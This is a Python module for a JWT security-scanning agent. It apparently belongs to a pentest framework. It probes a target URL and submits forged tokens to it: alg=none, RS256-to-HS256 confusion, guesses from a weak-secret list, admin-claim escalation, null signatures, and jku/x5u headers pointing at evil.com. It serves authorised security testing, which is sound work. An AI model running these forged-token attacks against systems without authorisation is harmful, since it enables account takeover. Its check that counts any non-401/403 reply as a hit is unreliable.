"""
JWT Security Agent for Nexus Hunter
Comprehensive JWT (JSON Web Token) security vulnerability assessment
"""

import asyncio
import base64
import json
import hashlib
import hmac
import re
import time
import uuid
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass

import httpx
from loguru import logger

from agents.base import BaseAgent


@dataclass
class JWTVulnerability:
    """JWT security vulnerability"""
    name: str
    description: str
    severity: str
    category: str
    evidence: str
    exploit_payload: str
    recommendation: str


class JWTSecurityAgent(BaseAgent):
    """Advanced JWT security vulnerability detection agent"""
    
    def __init__(self):
        super().__init__("JWTSecurityAgent")
        self.discovered_tokens = []
        self.tested_tokens = set()
        self.vulnerabilities = []
        
        # Common JWT locations
        self.jwt_locations = [
            "Authorization",     # Authorization: Bearer <token>
            "X-Access-Token",
            "X-JWT-Token", 
            "X-Auth-Token",
            "access_token",
            "token",
            "jwt",
            "id_token",
            "refresh_token"
        ]
        
        # Common weak secrets for HMAC testing
        self.common_secrets = [
            "",                    # Empty secret
            "secret",             # Default secret
            "key",                # Simple key
            "your-256-bit-secret", # Documentation example
            "your-secret-key",
            "jwt-secret",
            "supersecret",
            "password",
            "admin",
            "test",
            "debug",
            "development",
            "prod",
            "production",
            "default"
        ]
        
        # RSA public keys for testing (common/weak keys)
        self.test_rsa_keys = {
            "weak_key_1": """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4f5wg5l2hKsTeNem/V41
fGnJm6gOdrj8ym3rFkEjWT2btf5h8CvNy3PST7M8XgYvzQ+7c6mNYx8zRqAz5jTJ
gxNmYLn1cqCfkK5p6C7lRcVRjM/PfhZGFz/3IKzHqPOZKrLjKvj7P/g6J3NgSbNL
r7kO7G+jZE4VFDpwYelKtTZwZW3vYU7XBEkfzM0dC/KAmNj3/PdHvWYOqJyLbkOl
Sz60+xE8zPnJdL1CEbAYvBY7FKT6P7LO5Eai1TgUgNKhVhwRxAoYkQxC8l5pYJYF
Mh8hC6UcXfZcP+UdFRXdNs9V3bgGNKt6zjbYBGPwQnrUoLQD9qH6oJT5lYOxL6qY
FQIDAQAB
-----END PUBLIC KEY-----""",
            "weak_key_2": """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDdwJmuFqW7e5Z8z7xc8EZ0pxbW
gQGHsX4CKSRs8j2wOa2A8K9Wf5DaTnK6F2x7c+jG3nJhGd8aV1uC0A8w3CvQ5o1a
G4jU3GqF7E6VGvZsWnCvf9vq8wQ+1G4+8KCrF9K6c8VVzG2DQIDAQAB
-----END PUBLIC KEY-----"""
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Main execution method required by BaseAgent"""
        return await self.scan(target, **(config or {}))
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive JWT security assessment
        
        Args:
            target: Target URL or domain to test
            **kwargs: Additional scan options
        """
        try:
            results = {
                "target": target,
                "jwt_tokens_found": [],
                "vulnerabilities": [],
                "tested_attacks": [],
                "token_analysis": {},
                "statistics": {}
            }
            
            self.logger.info(f"Starting JWT security scan for {target}")
            
            # Phase 1: Discover JWT tokens
            tokens = await self._discover_jwt_tokens(target)
            results["jwt_tokens_found"] = tokens
            
            if not tokens:
                self.logger.warning("No JWT tokens found for analysis")
                return results
            
            # Phase 2: Analyze each token
            for token_info in tokens:
                token_analysis = await self._analyze_jwt_token(token_info)
                results["token_analysis"][token_info["location"]] = token_analysis
                
                # Phase 3: Test vulnerabilities
                vulns = await self._test_jwt_vulnerabilities(target, token_info, token_analysis)
                results["vulnerabilities"].extend(vulns)
            
            # Phase 4: Additional security tests
            additional_vulns = await self._test_additional_jwt_attacks(target, tokens)
            results["vulnerabilities"].extend(additional_vulns)
            
            # Analyze results
            results = await self._analyze_jwt_results(results)
            
            self.logger.info(f"JWT security scan completed for {target}")
            return results
            
        except Exception as e:
            self.logger.error(f"JWT security scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _discover_jwt_tokens(self, target: str) -> List[Dict[str, Any]]:
        """Discover JWT tokens in various locations"""
        found_tokens = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Test authenticated endpoints
                endpoints_to_test = [
                    target,
                    f"{target.rstrip('/')}/api",
                    f"{target.rstrip('/')}/login",
                    f"{target.rstrip('/')}/auth", 
                    f"{target.rstrip('/')}/user",
                    f"{target.rstrip('/')}/profile",
                    f"{target.rstrip('/')}/dashboard"
                ]
                
                for endpoint in endpoints_to_test:
                    try:
                        # GET request
                        response = await client.get(endpoint)
                        tokens = self._extract_tokens_from_response(response, endpoint, "GET")
                        found_tokens.extend(tokens)
                        
                        # Try POST with login attempt
                        login_data = {
                            "username": "test",
                            "password": "test",
                            "email": "test@example.com"
                        }
                        
                        response = await client.post(endpoint, data=login_data)
                        tokens = self._extract_tokens_from_response(response, endpoint, "POST")
                        found_tokens.extend(tokens)
                        
                    except Exception as e:
                        self.logger.debug(f"Token discovery failed for {endpoint}: {e}")
                
                # Test with common JWT cookies/headers
                for location in self.jwt_locations:
                    test_headers = {location: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test.test"}
                    try:
                        response = await client.get(target, headers=test_headers)
                        # If different response, might be JWT endpoint
                        if response.status_code != 404:
                            found_tokens.append({
                                "location": location,
                                "token": "test_token",
                                "discovery_method": "header_test",
                                "endpoint": target
                            })
                    except:
                        pass
        
        except Exception as e:
            self.logger.error(f"JWT token discovery failed: {e}")
        
        return found_tokens
    
    def _extract_tokens_from_response(self, response: httpx.Response, endpoint: str, method: str) -> List[Dict[str, Any]]:
        """Extract JWT tokens from HTTP response"""
        tokens = []
        
        try:
            # Check response headers
            for header_name, header_value in response.headers.items():
                if self._is_jwt_token(header_value):
                    tokens.append({
                        "token": header_value,
                        "location": f"header_{header_name}",
                        "discovery_method": "response_header",
                        "endpoint": endpoint,
                        "method": method
                    })
            
            # Check cookies
            for cookie in response.cookies.values():
                if self._is_jwt_token(cookie.value):
                    tokens.append({
                        "token": cookie.value,
                        "location": f"cookie_{cookie.name}",
                        "discovery_method": "cookie",
                        "endpoint": endpoint,
                        "method": method
                    })
            
            # Check response body
            try:
                response_text = response.text
                
                # Look for JSON responses containing tokens
                if "application/json" in response.headers.get("content-type", ""):
                    try:
                        json_data = response.json()
                        jwt_tokens = self._find_jwt_in_json(json_data)
                        for token in jwt_tokens:
                            tokens.append({
                                "token": token["value"],
                                "location": f"json_{token['key']}",
                                "discovery_method": "json_response",
                                "endpoint": endpoint,
                                "method": method
                            })
                    except:
                        pass
                
                # Regex search for JWT patterns in response
                jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
                matches = re.findall(jwt_pattern, response_text)
                for match in matches:
                    if self._is_jwt_token(match):
                        tokens.append({
                            "token": match,
                            "location": "response_body",
                            "discovery_method": "regex_match",
                            "endpoint": endpoint,
                            "method": method
                        })
            
            except Exception:
                pass
        
        except Exception as e:
            self.logger.debug(f"Token extraction failed: {e}")
        
        return tokens
    
    def _find_jwt_in_json(self, data: Any, prefix: str = "") -> List[Dict[str, Any]]:
        """Recursively find JWT tokens in JSON data"""
        tokens = []
        
        if isinstance(data, dict):
            for key, value in data.items():
                current_key = f"{prefix}.{key}" if prefix else key
                
                if isinstance(value, str) and self._is_jwt_token(value):
                    tokens.append({"key": current_key, "value": value})
                elif isinstance(value, (dict, list)):
                    tokens.extend(self._find_jwt_in_json(value, current_key))
        
        elif isinstance(data, list):
            for i, item in enumerate(data):
                current_key = f"{prefix}[{i}]" if prefix else f"[{i}]"
                if isinstance(item, str) and self._is_jwt_token(item):
                    tokens.append({"key": current_key, "value": item})
                elif isinstance(item, (dict, list)):
                    tokens.extend(self._find_jwt_in_json(item, current_key))
        
        return tokens
    
    def _is_jwt_token(self, token: str) -> bool:
        """Check if a string is a valid JWT token format"""
        if not token or not isinstance(token, str):
            return False
        
        # Remove Bearer prefix if present
        token = token.replace("Bearer ", "").strip()
        
        # JWT should have exactly 3 parts separated by dots
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Check if parts are base64url encoded
        try:
            for part in parts[:2]:  # Header and payload must be valid JSON
                if not part:
                    return False
                
                # Add padding if needed
                padded = part + '=' * (4 - len(part) % 4)
                decoded = base64.urlsafe_b64decode(padded)
                json.loads(decoded)
            
            # Signature can be empty for some algorithms
            if parts[2]:  # If signature exists, try to decode it
                padded_sig = parts[2] + '=' * (4 - len(parts[2]) % 4)
                base64.urlsafe_b64decode(padded_sig)
            
            return True
        
        except Exception:
            return False
    
    async def _analyze_jwt_token(self, token_info: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze JWT token structure and properties"""
        analysis = {
            "valid_format": False,
            "header": {},
            "payload": {},
            "signature_present": False,
            "algorithm": "unknown",
            "issues": [],
            "security_assessment": {}
        }
        
        try:
            token = token_info["token"].replace("Bearer ", "").strip()
            parts = token.split('.')
            
            if len(parts) != 3:
                analysis["issues"].append("Invalid JWT format - not 3 parts")
                return analysis
            
            # Decode header
            try:
                header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                header_decoded = base64.urlsafe_b64decode(header_padded)
                analysis["header"] = json.loads(header_decoded)
                analysis["algorithm"] = analysis["header"].get("alg", "unknown")
            except Exception as e:
                analysis["issues"].append(f"Invalid JWT header: {e}")
            
            # Decode payload
            try:
                payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                payload_decoded = base64.urlsafe_b64decode(payload_padded)
                analysis["payload"] = json.loads(payload_decoded)
            except Exception as e:
                analysis["issues"].append(f"Invalid JWT payload: {e}")
            
            # Check signature
            analysis["signature_present"] = len(parts[2]) > 0
            
            # Security assessment
            analysis["security_assessment"] = self._assess_jwt_security(analysis)
            analysis["valid_format"] = len(analysis["issues"]) == 0
            
        except Exception as e:
            analysis["issues"].append(f"JWT analysis failed: {e}")
        
        return analysis
    
    def _assess_jwt_security(self, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Assess JWT security characteristics"""
        assessment = {
            "weak_algorithm": False,
            "no_expiry": False,
            "long_expiry": False,
            "weak_signature": False,
            "sensitive_data": False,
            "issues": []
        }
        
        try:
            header = analysis.get("header", {})
            payload = analysis.get("payload", {})
            algorithm = analysis.get("algorithm", "")
            
            # Check algorithm security
            if algorithm in ["none", "None", "NONE"]:
                assessment["weak_algorithm"] = True
                assessment["issues"].append("Algorithm 'none' allows unsigned tokens")
            elif algorithm in ["HS256", "HS384", "HS512"] and len(algorithm) < 6:
                assessment["issues"].append("HMAC algorithm may be vulnerable to key confusion")
            
            # Check expiry
            if "exp" not in payload:
                assessment["no_expiry"] = True
                assessment["issues"].append("Token has no expiration time")
            else:
                try:
                    exp_time = int(payload["exp"])
                    current_time = int(time.time())
                    time_diff = exp_time - current_time
                    
                    if time_diff > 86400 * 30:  # 30 days
                        assessment["long_expiry"] = True
                        assessment["issues"].append("Token expiry is very long (>30 days)")
                except:
                    assessment["issues"].append("Invalid expiry time format")
            
            # Check for sensitive data in payload
            sensitive_keys = [
                "password", "secret", "key", "private", "confidential",
                "ssn", "credit_card", "phone", "address"
            ]
            
            for key, value in payload.items():
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    assessment["sensitive_data"] = True
                    assessment["issues"].append(f"Sensitive data in payload: {key}")
            
            # Check signature presence
            if not analysis.get("signature_present", False):
                assessment["weak_signature"] = True
                assessment["issues"].append("Token has no signature")
        
        except Exception as e:
            assessment["issues"].append(f"Security assessment failed: {e}")
        
        return assessment
    
    async def _test_jwt_vulnerabilities(self, target: str, token_info: Dict[str, Any], 
                                      analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test various JWT vulnerabilities"""
        vulnerabilities = []
        
        try:
            original_token = token_info["token"].replace("Bearer ", "").strip()
            
            # Test 1: Algorithm Confusion Attack (alg=none)
            none_vuln = await self._test_algorithm_none(target, token_info, original_token)
            if none_vuln:
                vulnerabilities.append(none_vuln)
            
            # Test 2: Algorithm Confusion (RS256 to HS256)
            alg_confusion_vuln = await self._test_algorithm_confusion(target, token_info, original_token, analysis)
            if alg_confusion_vuln:
                vulnerabilities.append(alg_confusion_vuln)
            
            # Test 3: Weak Secret Brute Force
            weak_secret_vuln = await self._test_weak_secrets(target, token_info, original_token, analysis)
            if weak_secret_vuln:
                vulnerabilities.append(weak_secret_vuln)
            
            # Test 4: Key Confusion Attack
            key_confusion_vuln = await self._test_key_confusion(target, token_info, original_token, analysis)
            if key_confusion_vuln:
                vulnerabilities.append(key_confusion_vuln)
            
            # Test 5: Token Manipulation
            manipulation_vulns = await self._test_token_manipulation(target, token_info, original_token, analysis)
            vulnerabilities.extend(manipulation_vulns)
            
            # Test 6: Null Signature
            null_sig_vuln = await self._test_null_signature(target, token_info, original_token)
            if null_sig_vuln:
                vulnerabilities.append(null_sig_vuln)
            
        except Exception as e:
            self.logger.error(f"JWT vulnerability testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_algorithm_none(self, target: str, token_info: Dict[str, Any], original_token: str) -> Optional[Dict[str, Any]]:
        """Test algorithm none vulnerability"""
        try:
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode and modify header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            
            # Change algorithm to 'none'
            header["alg"] = "none"
            
            # Create new token with no signature
            new_header = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
            new_token = f"{new_header}.{parts[1]}."  # Empty signature
            
            # Test the modified token
            is_vulnerable = await self._test_modified_token(target, token_info, new_token)
            
            if is_vulnerable:
                return {
                    "name": "Algorithm None Attack",
                    "description": "JWT accepts tokens with algorithm 'none'",
                    "severity": "high",
                    "category": "Algorithm Confusion",
                    "evidence": f"Modified token accepted: {new_token[:50]}...",
                    "exploit_payload": new_token,
                    "recommendation": "Reject tokens with algorithm 'none'"
                }
        
        except Exception as e:
            self.logger.debug(f"Algorithm none test failed: {e}")
        
        return None
    
    async def _test_algorithm_confusion(self, target: str, token_info: Dict[str, Any], 
                                      original_token: str, analysis: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test RS256 to HS256 algorithm confusion"""
        try:
            algorithm = analysis.get("algorithm", "")
            
            if not algorithm.startswith("RS"):
                return None  # Only test if original is RSA
            
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header and payload
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            
            # Change algorithm to HMAC
            header["alg"] = "HS256"
            
            # Try signing with common/weak RSA public keys as HMAC secrets
            for key_name, public_key in self.test_rsa_keys.items():
                try:
                    # Use public key as HMAC secret
                    new_header = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
                    message = f"{new_header}.{parts[1]}"
                    
                    # Sign with public key as secret
                    signature = hmac.new(
                        public_key.encode(),
                        message.encode(),
                        hashlib.sha256
                    ).digest()
                    
                    new_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                    new_token = f"{message}.{new_signature}"
                    
                    # Test the confused token
                    is_vulnerable = await self._test_modified_token(target, token_info, new_token)
                    
                    if is_vulnerable:
                        return {
                            "name": "Algorithm Confusion Attack",
                            "description": f"RSA to HMAC algorithm confusion successful with {key_name}",
                            "severity": "critical",
                            "category": "Algorithm Confusion",
                            "evidence": f"RS256 token accepted as HS256 with public key as secret",
                            "exploit_payload": new_token,
                            "recommendation": "Strictly validate JWT algorithms and use algorithm allowlists"
                        }
                
                except Exception:
                    continue
        
        except Exception as e:
            self.logger.debug(f"Algorithm confusion test failed: {e}")
        
        return None
    
    async def _test_weak_secrets(self, target: str, token_info: Dict[str, Any], 
                               original_token: str, analysis: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test for weak HMAC secrets"""
        try:
            algorithm = analysis.get("algorithm", "")
            
            if not algorithm.startswith("HS"):
                return None  # Only test HMAC algorithms
            
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            message = f"{parts[0]}.{parts[1]}"
            
            # Test common weak secrets
            for secret in self.common_secrets:
                try:
                    # Generate signature with weak secret
                    if algorithm == "HS256":
                        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                    elif algorithm == "HS384":
                        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                    elif algorithm == "HS512":
                        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
                    else:
                        continue
                    
                    expected_signature = base64.urlsafe_b64decode(parts[2] + '=' * (4 - len(parts[2]) % 4))
                    
                    if signature == expected_signature:
                        return {
                            "name": "Weak JWT Secret",
                            "description": f"JWT signed with weak secret: '{secret}'",
                            "severity": "critical",
                            "category": "Weak Cryptography",
                            "evidence": f"Token can be forged using weak secret: {secret}",
                            "exploit_payload": f"Secret: {secret}",
                            "recommendation": "Use strong, randomly generated secrets (>32 characters)"
                        }
                
                except Exception:
                    continue
        
        except Exception as e:
            self.logger.debug(f"Weak secret test failed: {e}")
        
        return None
    
    async def _test_key_confusion(self, target: str, token_info: Dict[str, Any], 
                                original_token: str, analysis: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test for key confusion vulnerabilities"""
        try:
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode payload and modify claims
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            
            # Try to escalate privileges
            privilege_tests = [
                {"admin": True},
                {"role": "admin"},
                {"isAdmin": True},
                {"permissions": ["admin", "all"]},
                {"scope": "admin"},
                {"user_type": "admin"}
            ]
            
            for privilege_modification in privilege_tests:
                modified_payload = payload.copy()
                modified_payload.update(privilege_modification)
                
                # Create new token with modified payload
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(modified_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                # Try with original signature (signature not validated properly)
                new_token = f"{parts[0]}.{new_payload}.{parts[2]}"
                
                is_vulnerable = await self._test_modified_token(target, token_info, new_token)
                
                if is_vulnerable:
                    return {
                        "name": "JWT Payload Manipulation",
                        "description": "JWT payload can be modified without signature validation",
                        "severity": "critical",
                        "category": "Signature Bypass",
                        "evidence": f"Modified payload accepted: {privilege_modification}",
                        "exploit_payload": new_token,
                        "recommendation": "Properly validate JWT signatures and implement signature verification"
                    }
        
        except Exception as e:
            self.logger.debug(f"Key confusion test failed: {e}")
        
        return None
    
    async def _test_token_manipulation(self, target: str, token_info: Dict[str, Any], 
                                     original_token: str, analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test various token manipulation attacks"""
        vulnerabilities = []
        
        try:
            parts = original_token.split('.')
            if len(parts) != 3:
                return vulnerabilities
            
            # Test 1: Expired token handling
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            
            if "exp" in payload:
                # Set token to expired
                expired_payload = payload.copy()
                expired_payload["exp"] = int(time.time()) - 3600  # 1 hour ago
                
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(expired_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                expired_token = f"{parts[0]}.{new_payload}.{parts[2]}"
                
                # Test if expired token is accepted
                if await self._test_modified_token(target, token_info, expired_token):
                    vulnerabilities.append({
                        "name": "Expired Token Accepted",
                        "description": "Application accepts expired JWT tokens",
                        "severity": "medium",
                        "category": "Token Validation",
                        "evidence": "Expired token was accepted by the application",
                        "exploit_payload": expired_token,
                        "recommendation": "Implement proper expiration time validation"
                    })
            
            # Test 2: Future token (not yet valid)
            if "nbf" not in payload:  # Add nbf (not before) claim
                future_payload = payload.copy()
                future_payload["nbf"] = int(time.time()) + 3600  # 1 hour in future
                
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(future_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                future_token = f"{parts[0]}.{new_payload}.{parts[2]}"
                
                if await self._test_modified_token(target, token_info, future_token):
                    vulnerabilities.append({
                        "name": "Future Token Accepted",
                        "description": "Application accepts tokens that are not yet valid (nbf claim)",
                        "severity": "low",
                        "category": "Token Validation",
                        "evidence": "Token with future 'not before' time was accepted",
                        "exploit_payload": future_token,
                        "recommendation": "Validate 'nbf' (not before) claims"
                    })
        
        except Exception as e:
            self.logger.debug(f"Token manipulation test failed: {e}")
        
        return vulnerabilities
    
    async def _test_null_signature(self, target: str, token_info: Dict[str, Any], original_token: str) -> Optional[Dict[str, Any]]:
        """Test null signature vulnerability"""
        try:
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            # Create token with null/empty signature
            null_signature_token = f"{parts[0]}.{parts[1]}."
            
            is_vulnerable = await self._test_modified_token(target, token_info, null_signature_token)
            
            if is_vulnerable:
                return {
                    "name": "Null Signature Accepted",
                    "description": "JWT token with null/empty signature is accepted",
                    "severity": "critical",
                    "category": "Signature Bypass", 
                    "evidence": "Token with empty signature was accepted",
                    "exploit_payload": null_signature_token,
                    "recommendation": "Reject tokens with missing or empty signatures"
                }
        
        except Exception as e:
            self.logger.debug(f"Null signature test failed: {e}")
        
        return None
    
    async def _test_modified_token(self, target: str, token_info: Dict[str, Any], modified_token: str) -> bool:
        """Test if a modified token is accepted by the application"""
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                location = token_info["location"]
                endpoint = token_info["endpoint"]
                
                # Prepare request based on token location
                if location.startswith("header_"):
                    header_name = location.replace("header_", "")
                    if header_name.lower() == "authorization":
                        headers = {header_name: f"Bearer {modified_token}"}
                    else:
                        headers = {header_name: modified_token}
                    
                    response = await client.get(endpoint, headers=headers)
                
                elif location.startswith("cookie_"):
                    cookie_name = location.replace("cookie_", "")
                    cookies = {cookie_name: modified_token}
                    response = await client.get(endpoint, cookies=cookies)
                
                else:
                    # Try as Authorization header by default
                    headers = {"Authorization": f"Bearer {modified_token}"}
                    response = await client.get(endpoint, headers=headers)
                
                # Check if the response indicates the token was accepted
                # A successful response (2xx) or different error than expected might indicate acceptance
                if response.status_code in [200, 201, 202, 204]:
                    return True
                
                # Check for authentication success indicators in response
                success_indicators = [
                    "success", "authenticated", "authorized", "welcome", "dashboard",
                    "profile", "user", "admin", "logged in"
                ]
                
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in success_indicators):
                    return True
                
                # Check if we get different error than 401/403 (might indicate processing)
                if response.status_code not in [401, 403]:
                    return True
        
        except Exception as e:
            self.logger.debug(f"Modified token test failed: {e}")
        
        return False
    
    async def _test_additional_jwt_attacks(self, target: str, tokens: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test additional JWT security attacks"""
        vulnerabilities = []
        
        try:
            # Test JWT header injection
            for token_info in tokens:
                header_injection_vuln = await self._test_jwt_header_injection(target, token_info)
                if header_injection_vuln:
                    vulnerabilities.append(header_injection_vuln)
                
                # Test JWT confusion with other token types
                token_confusion_vuln = await self._test_token_type_confusion(target, token_info)
                if token_confusion_vuln:
                    vulnerabilities.append(token_confusion_vuln)
        
        except Exception as e:
            self.logger.error(f"Additional JWT attacks failed: {e}")
        
        return vulnerabilities
    
    async def _test_jwt_header_injection(self, target: str, token_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test JWT header injection vulnerabilities"""
        try:
            original_token = token_info["token"].replace("Bearer ", "").strip()
            parts = original_token.split('.')
            
            if len(parts) != 3:
                return None
            
            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            
            # Test various header injections
            malicious_headers = [
                {"jku": "http://evil.com/jwks.json"},  # JWK Set URL injection
                {"kid": "../../../dev/null"},          # Key ID path traversal
                {"x5u": "http://evil.com/cert.pem"},   # X.509 URL injection
                {"crit": ["exp", "jku"]},              # Critical header manipulation
            ]
            
            for malicious_header in malicious_headers:
                modified_header = header.copy()
                modified_header.update(malicious_header)
                
                new_header = base64.urlsafe_b64encode(
                    json.dumps(modified_header, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                new_token = f"{new_header}.{parts[1]}.{parts[2]}"
                
                is_vulnerable = await self._test_modified_token(target, token_info, new_token)
                
                if is_vulnerable:
                    return {
                        "name": "JWT Header Injection",
                        "description": f"JWT header injection successful: {malicious_header}",
                        "severity": "high",
                        "category": "Header Injection",
                        "evidence": f"Malicious header accepted: {malicious_header}",
                        "exploit_payload": new_token,
                        "recommendation": "Validate and sanitize JWT headers, especially jku, kid, and x5u claims"
                    }
        
        except Exception as e:
            self.logger.debug(f"JWT header injection test failed: {e}")
        
        return None
    
    async def _test_token_type_confusion(self, target: str, token_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test token type confusion attacks"""
        try:
            # Test if other token formats are accepted in JWT locations
            fake_tokens = [
                "sessionid123456789",
                "api_key_12345",
                "bearer_token_xyz",
                base64.b64encode(b"fake_session_data").decode()
            ]
            
            for fake_token in fake_tokens:
                is_vulnerable = await self._test_modified_token(target, token_info, fake_token)
                
                if is_vulnerable:
                    return {
                        "name": "Token Type Confusion",
                        "description": "Application accepts non-JWT tokens in JWT locations",
                        "severity": "medium",
                        "category": "Token Validation",
                        "evidence": f"Non-JWT token accepted: {fake_token}",
                        "exploit_payload": fake_token,
                        "recommendation": "Implement strict JWT format validation"
                    }
        
        except Exception as e:
            self.logger.debug(f"Token type confusion test failed: {e}")
        
        return None
    
    async def _analyze_jwt_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize JWT security results"""
        try:
            vulnerabilities = results["vulnerabilities"]
            
            # Categorize by severity
            critical_vulns = [v for v in vulnerabilities if v.get("severity") == "critical"]
            high_vulns = [v for v in vulnerabilities if v.get("severity") == "high"]
            medium_vulns = [v for v in vulnerabilities if v.get("severity") == "medium"]
            low_vulns = [v for v in vulnerabilities if v.get("severity") == "low"]
            
            # Categorize by attack type
            algorithm_attacks = [v for v in vulnerabilities if v.get("category") == "Algorithm Confusion"]
            signature_bypasses = [v for v in vulnerabilities if v.get("category") == "Signature Bypass"]
            weak_crypto = [v for v in vulnerabilities if v.get("category") == "Weak Cryptography"]
            validation_issues = [v for v in vulnerabilities if v.get("category") == "Token Validation"]
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["attack_categories"] = {
                "algorithm_confusion": algorithm_attacks,
                "signature_bypass": signature_bypasses,
                "weak_cryptography": weak_crypto,
                "validation_issues": validation_issues
            }
            
            # Calculate risk score
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["statistics"] = {
                "total_vulnerabilities": len(vulnerabilities),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "jwt_tokens_found": len(results["jwt_tokens_found"]),
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score)
            }
            
            results["recommendations"] = self._generate_jwt_recommendations(results)
            
            return results
        
        except Exception as e:
            self.logger.error(f"JWT results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 12:
            return "CRITICAL"
        elif risk_score >= 8:
            return "HIGH"
        elif risk_score >= 4:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_jwt_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate JWT-specific security recommendations"""
        recommendations = []
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "CRITICAL: Implement proper JWT signature verification",
                "Use strong, randomly generated secrets for HMAC algorithms",
                "Reject tokens with algorithm 'none'",
                "Implement strict algorithm allowlisting",
                "Validate JWT expiration times (exp claim)",
                "Use RS256 or ES256 instead of HS256 when possible"
            ])
        
        # Category-specific recommendations
        categories = results.get("attack_categories", {})
        
        if categories.get("algorithm_confusion"):
            recommendations.extend([
                "Prevent algorithm confusion attacks by validating expected algorithms",
                "Use separate keys for different algorithms",
                "Implement algorithm allowlisting in JWT verification"
            ])
        
        if categories.get("signature_bypass"):
            recommendations.extend([
                "Always verify JWT signatures before trusting token contents",
                "Reject tokens with missing or empty signatures",
                "Implement proper signature verification libraries"
            ])
        
        if categories.get("weak_cryptography"):
            recommendations.extend([
                "Use strong, cryptographically secure secrets (>256 bits)",
                "Rotate JWT signing keys regularly",
                "Use industry-standard JWT libraries"
            ])
        
        recommendations.extend([
            "Implement proper JWT token storage security",
            "Use short expiration times with refresh token mechanism", 
            "Implement JWT token revocation/blacklisting",
            "Regular JWT security audits and penetration testing",
            "Monitor for suspicious JWT usage patterns"
        ])
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of JWT vulnerabilities this agent can detect"""
        return [
            "Algorithm None Attack",
            "Algorithm Confusion Attack",
            "Weak JWT Secret",
            "Key Confusion Attack",
            "Null Signature Bypass",
            "JWT Header Injection",
            "Token Type Confusion",
            "JWT Payload Manipulation",
            "Expired Token Acceptance",
            "JWT Timing Attacks"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Comprehensive JWT security vulnerability assessment agent covering algorithm confusion, weak secrets, signature bypass, and token manipulation attacks"

